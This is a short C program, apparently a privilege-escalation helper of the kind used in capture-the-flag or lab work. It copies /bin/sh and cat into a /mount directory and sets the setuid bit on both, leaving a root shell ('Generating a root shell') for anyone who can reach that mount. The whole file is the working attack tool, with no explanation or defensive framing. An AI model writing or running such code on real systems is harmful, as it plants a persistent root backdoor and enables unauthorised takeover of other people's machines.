#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
    printf("\"Generating\" a root shell...\n");
    system("cp /bin/sh /usr/bin/cat /mount");
    system("chmod a+s /mount/sh /mount/cat");
    return 0;
}
